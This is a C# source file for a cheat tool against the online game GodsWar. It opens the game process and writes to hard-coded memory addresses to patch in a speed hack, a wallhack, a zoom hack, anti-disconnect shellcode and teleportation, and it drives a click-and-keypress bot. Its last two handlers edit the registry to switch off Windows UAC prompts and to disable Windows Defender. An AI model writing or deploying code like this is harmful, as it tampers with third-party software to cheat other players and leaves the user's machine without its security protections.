using Microsoft.VisualBasic.CompilerServices;
using System;
using GodswarHack;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using Microsoft.Win32;

namespace RPbox
{
    public partial class Form1 : Form
    {
        //normal keys
 
        public static int WM_NCLBUTTONDOWN = 0xA1; //to be able to move the form
        public static int HT_CAPTION = 0x2; //here wit the above

        [DllImport("kernel32.dll")]
        public static extern bool ReadProcessMemory(int handle, int address, ref float val, int size, ref int last);

        [DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory")]
        public static extern bool ReadProcessMemory_2(int handle, int address, ref int buffer, int numbytes, ref int last);

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr gWnd, UInt32 msg, int wParam, int lpad);

        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        [DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory")]
        public static extern bool ReadProcessMemory_1(int handle, int address, byte[] buffer, int numbytes, int last);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int OpenProcess(uint Access, int whatever, int id);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(int handle, int addr, int buffer, int numbytes, int last);

        [DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory")]
        public static extern bool WriteProcessMemory_1(int handle, int address, ref int value, int numbytes, ref int last);

        [DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory")]
        static extern bool WriteProcessMemory_2(int handle, int addr, byte[] val, int val2, int last);

        [DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory" ,SetLastError = true)]
        public static extern bool WriteProcessMemory_1(int handle, int addr, byte[] bufffer, int numbBytes, ref int last);

        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern void mouse_event(int int_33, int int_34, int int_35, int int_36, int int_37);

        [DllImport("user32.dll")]
        public static extern bool GetWindowRect(IntPtr inta, ref Rectangle whatever);

        [DllImport("user32.dll")]
        public static extern bool SetForegroundWindow(IntPtr handle);

        [DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern int SetCursorPos(int int_33, int int_34);


        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            button2.Enabled = false;
            button6.Enabled = false;
            textBox1.Enabled = false;
            textBox2.Enabled = false;
            button4.Enabled = false;
            checkBox1.Enabled = false;
            checkBox2.Enabled = false;
            WallHack.Enabled = false;
            button5.Enabled = false;
            button9.Enabled = false;
            Process[] gw = Process.GetProcessesByName("GodsWar");
            foreach (Process a in gw)
            {
               Processididid.Items.Add(a.Id);
            }
        }

        
        //Function to be able to move the form
        private void Form1_MouseDown(object sender, System.Windows.Forms.MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, (uint)WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        //function to close the form
        private void CloseButton(object sender, EventArgs e)
        {
            Application.Exit();
           
        }

        //Anonimous picture box
        private void pictureBox1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("we are anony... wait, im not XDD","HUHUHU");
        }

        //AI AFK KILLER BUTTON
        private void AutoSavy(object sender, EventArgs e)
        {
            GodswarHack.AutoSavy savy = new GodswarHack.AutoSavy();
            savy.Show();
            
        }

        //Refresh function
        private void refresh(object sender, EventArgs e)
        {
            button7.Text = "Attach";
            button7.ForeColor = System.Drawing.Color.Aqua;
            Processididid.Items.Clear();
            Processididid.Enabled = true;
            button6.Enabled = false;
            button2.Enabled = false;
            textBox1.Enabled = false;
            textBox2.Enabled = false;
            button4.Enabled = false;
            textBox1.Clear();
            textBox2.Clear();
            checkBox1.Enabled = false;
            checkBox2.Enabled = false;
            WallHack.Enabled = false;
            button5.Enabled = false;
            button9.Enabled = false;
            label2.Text = "";
            getGWID();//get processes and adds them to the list
        }

        //GetGodswarID function
        public  void getGWID()
        {
            Process[] gw = Process.GetProcessesByName("GodsWar");
            foreach (Process a in gw)
            {
                Processididid.Items.Add(a.Id);
            }
        }

        //Attach button
        private void button7_Click(object sender, EventArgs e)
        {
            if (Processididid.SelectedItems.Count > 0)
            {
                button7.Text = "Attached";
                button7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(248)))), ((int)(((byte)(49)))));
                Processididid.Enabled = false;
                button2.Enabled = true;
                button6.Enabled = true;
                textBox1.Enabled = true;
                textBox2.Enabled = true;
                button4.Enabled = true;
                checkBox1.Enabled = true;
                checkBox2.Enabled = true;
                WallHack.Enabled = true;
                button5.Enabled = true;
                button9.Enabled = true;
            }
        }

        //process button
        private void PressingProcess(object sender, MouseEventArgs e)
        {
            int pid = Conversions.ToInteger(Processididid.SelectedItem);

            int handle = OpenProcess(2035711,0,pid);
            int IgnAddr = 0x15B6158; //memory address to read IGN name
            byte[] array1 = new byte[21]; //create a byte array which works as opening 21 spaces in memory
            int last1 = 0;
            ReadProcessMemory_1(handle, IgnAddr, array1, array1.Length, last1); 
            string text = Encoding.UTF8.GetString(array1).ToString();
            label2.Text = text;
            GodswarHack.AutoSavyFolder.MemoryFunc.CloseHandle(handle);
        }

        //AntiDC button
        #region
        private void button6_Click(object sender, EventArgs e)
        {
            button6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(248)))), ((int)(((byte)(49)))));

            if (button6.Text == "Activate")
            {
                button6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(248)))), ((int)(((byte)(49)))));
                button6.Text = "Activated";
                int pid = Conversions.ToInteger(Processididid.SelectedItem);
                int num2 = OpenProcess(33773329, 0, pid);
                byte[] array = new byte[]
                    {
                    233,
                    128,
                    23,
                    2,
                    1,
                    15,
                    31,
                    64
                    };
                int int_ = num2;
                int int_2 = 5105787;
                byte[] byte_ = array;
                int int_3 = 9;
                int num3 = 0;
                WriteProcessMemory_1(int_, int_2, byte_, int_3, ref num3);
                byte[] array2 = new byte[]
                {
                    102,
                    139,
                    123,
                    6,
                    102,
                    129,
                    byte.MaxValue,
                    51,
                    39,
                    116,
                    10,
                    15,
                    31,
                    64,
                    0,
                    117,
                    18,
                    15,
                    31,
                    64,
                    0,
                    131,
                    248,
                    0,
                    15,
                    132,
                    199,
                    11,
                    254,
                    254,
                    233,
                    97,
                    232,
                    253,
                    254,
                    131,
                    248,
                    1,
                    15,
                    132,
                    185,
                    11,
                    254,
                    254,
                    233,
                    83,
                    232,
                    253,
                    254,
                    233,
                    78,
                    232,
                    253,
                    254
                };
                int int_4 = num2;
                int int_5 = 22020096;
                byte[] byte_2 = array2;
                int int_6 = array2.Length;
                num3 = 0;
                WriteProcessMemory_1(int_4, int_5, byte_2, int_6, ref num3);
                GodswarHack.AutoSavyFolder.MemoryFunc.CloseHandle(num2);
            }

            //takes off the anti dc
            else if (button6.Text == "Activated")
            {
                button6.ForeColor = System.Drawing.Color.Aqua;
                button6.Text = "Activate";
                int pid = Conversions.ToInteger(Processididid.SelectedItem);
                int handle = OpenProcess(33773329, 0, pid);
                byte[] array = new byte[]
                {
                    131,
                    248,
                    1,
                    15,
                    132,
                    97,
                    35,
                    0
                };
                int num2 = 0;
                WriteProcessMemory_1(handle, 5105787, array, array.Length, ref num2);
                GodswarHack.AutoSavyFolder.MemoryFunc.CloseHandle(handle);
            }


        }
        #endregion

        //GO BUTTON
        private void button4_Click(object sender, EventArgs e)
        {
            gotoLoc(Conversions.ToInteger(this.textBox1.Text), Conversions.ToInteger(this.textBox2.Text));
        }


        //The gotoLoc to start the AI Bot
        #region
        public static void gotoLoc(int x , int y)
        {
            int pid = Conversions.ToInteger(Processididid.SelectedItem);
            try
            {
                 Process ok = Process.GetProcessById(pid);


                int pidLast = ok.Id;

                int handle = OpenProcess(2035711, 0, pidLast);
                int addr = 0x015762C4;
                int buffer = 0;
                int numbytes = 4;
                int last = 0;
                //READ PROCESS MEMORY PARAMETERS HAVE TO BE AS SAME AS PARAMETERS TO WRITE IN ORDER TO WRITE TO POINTERS
                ReadProcessMemory_2(handle, addr, ref buffer, numbytes, ref last);
                int coordX = buffer + 0x70;
                int coordY = buffer + 0x74;
                aActivateWind();
                MoveMouse();
                Thread.Sleep(200);
                WriteProcessMemory_1(handle, coordX, ref x, numbytes, ref last);
                WriteProcessMemory_1(handle, coordY, ref y, numbytes, ref last);
                MouseEventFunc();
                GodswarHack.AutoSavyFolder.MemoryFunc.CloseHandle(handle);
            }
            catch
            {
                MessageBox.Show("Run godswar Online pls");
                return;
            }
            
        }
        #endregion

        #region
        public static void MoveMouse()
        {
            int pid = Conversions.ToInteger(Processididid.SelectedItem);

            Rectangle gw = default(Rectangle);
            IntPtr mainhandle = Process.GetProcessById(pid).MainWindowHandle;
            GetWindowRect(mainhandle, ref gw);

            SetCursorPos(gw.X, gw.Y);

            SetCursorPos(gw.X + 727, gw.Y + 108);
            MouseEventFunc();
            SetCursorPos(gw.X + 657, gw.Y + 154);

        }

        #endregion

        //Activates the windows with setForeground window
        public static void  aActivateWind()
        {
            int pid = Conversions.ToInteger(Processididid.SelectedItem);
            Process ok = Process.GetProcessById(pid);
            SetForegroundWindow(ok.MainWindowHandle);
        }

        //drag the mouse
        

        public static void MouseEventFunc()
        {
            //Mouse down
            mouse_event(2, 0, 0, 0, 1);

            //MouseUp
            mouse_event(4, 0, 0, 0, 1);
        }


        private void button3_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        //speed hack
        #region
        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
               int process = Conversions.ToInteger(Processididid.SelectedItem);
               Process gw = Process.GetProcessById(process);
           
                if (checkBox1.Checked)
                {
                    timer2.Enabled = true;
                    int handle = OpenProcess(2035711, 0, gw.Id);
                    int address = 4793152;
                    int valuetoWrite = 16300928;
                    int numofBytes = 4;
                    int last = 0;
                    WriteProcessMemory_1(handle, address, ref valuetoWrite, numofBytes, ref last);
                    int handle2 = handle;
                    int anddress2 = 22503084;
                    int valueToWrite2 = 22503084;
                    int numofByes2 = 4;
                    int last2 = 0;
                    ReadProcessMemory_2(handle, anddress2, ref valueToWrite2, numofByes2, ref last2);
                    int handle3 = handle2;
                    int Address3 = valueToWrite2 + Convert.ToInt32("28C", 16);
                    int numofByes3 = 4;
                    last = 1072902963;
                    int LastLast = 0;
                    WriteProcessMemory_1(handle3, Address3, ref last, numofByes3, ref LastLast);
                    GodswarHack.AutoSavyFolder.MemoryFunc.CloseHandle(handle);

                }
                else
                {
                    timer2.Enabled = false;
                    int handle = OpenProcess(2035711, 0, gw.Id);
                    int address = 4793152;
                    int valuetoWrite = 74496896;
                    int numofBytes = 4;
                    int last = 0;
                    WriteProcessMemory_1(handle, address, ref valuetoWrite, numofBytes, ref last);
                    int handle2 = handle;
                    int anddress2 = 22503084;
                    int valueToWrite2 = 22503084;
                    int numofByes2 = 4;
                    int last2 = 0;
                    ReadProcessMemory_2(handle, anddress2, ref valueToWrite2, numofByes2, ref last2);
                    int handle3 = handle2;
                    int Address3 = valueToWrite2 + Convert.ToInt32("28C", 16);
                    int numofByes3 = 4;
                    last = 1067702026;
                    int LastLast = 0;
                    WriteProcessMemory_1(handle3, Address3, ref last, numofByes3, ref LastLast);
                    GodswarHack.AutoSavyFolder.MemoryFunc.CloseHandle(handle);
                }
            
        }
        #endregion

        //zoom hack
        #region
        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            
                int pid = Conversions.ToInteger(Processididid.SelectedItem);
                if (checkBox2.Checked)
                {
                    //with this we nop the instruction of the zoom hack
                    //which allows us to zoom infinitely
                    int handle = OpenProcess(2035711, 0, pid);
                    int address = 0x004801A4;
                    byte[] valueToWrite = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
                    int last = 0;
                    WriteProcessMemory_2(handle, address, valueToWrite, valueToWrite.Length, last);
                }
                else
                {
                    int handle = OpenProcess(2035711, 0, pid);
                    int address = 0x004801A4;
                    byte[] valueToWrite = { 0xD9, 0x1D, 0x00, 0x96, 0x9C, 0x00 };
                    int last = 0;
                    WriteProcessMemory_2(handle, address, valueToWrite, valueToWrite.Length, last);
                }
            
        }
        #endregion

        //AutoDC program
        private void AutoDCClicked(object sender, EventArgs e)
        {
            AutoDCForm dcform = new AutoDCForm();
            dcform.Show();
        }

        //wallhack
        #region
        private void wallHack(object sender, EventArgs e)
        {
            int pID = Conversions.ToInteger(Processididid.SelectedItem);
            if (WallHack.Checked)
            {   
                int handle = OpenProcess(2035711, 0, pID);
                int wallAddr = 4792991;
                int value = 151;
                int bytesToWrite = 4;
                int last = 0;
                WriteProcessMemory_1(handle, wallAddr, ref value, bytesToWrite, ref last);
                GodswarHack.AutoSavyFolder.MemoryFunc.CloseHandle(handle);
            }
            else
            {
                int handle = OpenProcess(2035711, 0, pID);
                int wallAddr = 4792991;
                int value = 2820;
                int bytesToWrite = 4;
                int last = 0;
                WriteProcessMemory_1(handle, wallAddr, ref value, bytesToWrite, ref last);
                GodswarHack.AutoSavyFolder.MemoryFunc.CloseHandle(handle);
            }
        }
        #endregion

        //open rb panel
        #region
        private void button9_Click(object sender, EventArgs e)
        { 
            
            if(button9.Text == "OpenRB")
            {
                OpenRB.RB_ADDR(true);
                button9.Text = "Activated";
                button9.ForeColor = Color.FromArgb(((int)(((byte)(100)))), ((int)(((byte)(248)))), ((int)(((byte)(49)))));
            }
            else if(button9.Text == "Activated")
            {
                OpenRB.RB_ADDR(false);
                button9.ForeColor = Color.Aqua;
                button9.Text = "OpenRB";
            }

        }
        #endregion


        public static int getPID()
        {
            int pid = Conversions.ToInteger(Processididid.SelectedItem);
            return pid;
        }

        //function to send keys
        public static void SendKey(string key)
        {
            int pid = (int)Processididid.SelectedItem;
            IntPtr gw = Process.GetProcessById(pid).MainWindowHandle;
            SetForegroundWindow(gw);
            Thread.Sleep(100);

            switch(key)
            {
                case "b":
                    SendKeys.SendWait("b");
                    return;

                case "c":
                    return;

                case "p":
                    SendKeys.SendWait("p");
                    return;

                case "l":
                    SendKeys.SendWait("l");
                    return;

               


            }
            

        }

        //function to drag the mouse
        public static void DragMouse(int locx, int locy, int locfinalx, int locfinaly)
        {
            int pid = Conversions.ToInteger(Processididid.SelectedItem);
            Rectangle gw = default(Rectangle);
            IntPtr mainHandle = Process.GetProcessById(pid).MainWindowHandle;

            GetWindowRect(mainHandle, ref gw);
            SetCursorPos(gw.X + locx, gw.Y + locy);
            SetForegroundWindow(mainHandle);
            //mouse down
            mouse_event(0x2, 0, 0, 0, 1);
            SetCursorPos(gw.X + locfinalx, gw.Y + locfinaly);
            Thread.Sleep(300);
            mouse_event(0x4, 0, 0, 0, 1);
            
            
        }

        public static void setCursor(int x, int y)
        {
            Rectangle gw = default(Rectangle);
            IntPtr mainHandle = Process.GetProcessById(Conversions.ToInteger(Processididid.SelectedItem)).MainWindowHandle;
            SetForegroundWindow(mainHandle);
            GetWindowRect(mainHandle, ref gw);
            SetCursorPos(gw.X, gw.Y);
            SetCursorPos(gw.X + x, gw.Y + y);
            
        }

        public static void click(int x, int y)
        {
            Rectangle gw = default(Rectangle);
            IntPtr mainHandle = Process.GetProcessById(getPID()).MainWindowHandle;
            GetWindowRect(mainHandle, ref gw);
            SetForegroundWindow(mainHandle);
            SetCursorPos(gw.X + x, gw.Y + y);
            mouse_event(0x2, 0, 0, 0, 1);
            Thread.Sleep(3);
            mouse_event(0x4, 0, 0, 0, 1);
        }

        public static void Rclick(int x, int y)
        {
            Rectangle gw = default(Rectangle);
            IntPtr mainHandle = Process.GetProcessById(getPID()).MainWindowHandle;
            SetForegroundWindow(mainHandle);
            GetWindowRect(mainHandle, ref gw);
            SetCursorPos(gw.X + x, gw.Y + y);
            mouse_event(0x8, 0, 0, 0, 1);
            Thread.Sleep(3);
            mouse_event(0x10, 0, 0, 0, 1);
        }

        private void A_Click(object sender, EventArgs e)
        {

        }

        //to be able to use keys on windows
        private void button10_Click(object sender, EventArgs e)
        {
            //Code to disable admin requests
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", true);
            registryKey.SetValue("EnableLUA", 0);
            registryKey.Close();
            registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", true);
            registryKey.SetValue("ConsentPromptBehaviorAdmin", 0);
            registryKey.Close();
        }

        private void NoProtect_Click(object sender, EventArgs e)
        {
            //code to disable windows protection
            RegistryKey registrykey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\", true);
            registrykey.SetValue("DisableAntiSpyware", 1);
            registrykey.Close();
            MessageBox.Show("Protection Disabled");

        }
    }
}
